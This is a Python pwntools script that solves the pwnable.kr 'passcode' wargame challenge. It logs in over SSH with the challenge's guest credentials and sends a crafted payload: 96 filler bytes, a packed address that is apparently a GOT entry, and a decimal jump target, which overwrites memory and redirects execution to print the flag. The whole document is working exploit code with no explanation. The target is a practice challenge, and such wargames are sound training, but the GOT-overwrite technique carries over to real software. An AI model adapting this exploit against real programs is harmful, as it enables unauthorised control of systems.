from pwn import *

shell = ssh('passcode' ,'pwnable.kr' ,password='guest', port=2222)

payload = b"A" * 96 + p32(0x804a004) + b'\n' + b'134514147'

process = shell.process(executable='./passcode', argv=['passcode'])
process.sendline(payload)

# Any of three is all ok to get flag
#print(process.recvall().decode('utf-8', 'backslashreplace'))
#print(process.recvall().decode('utf-8', 'ignore'))
print(process.recvall().decode('utf-8', 'replace'))

process.close()
shell.close()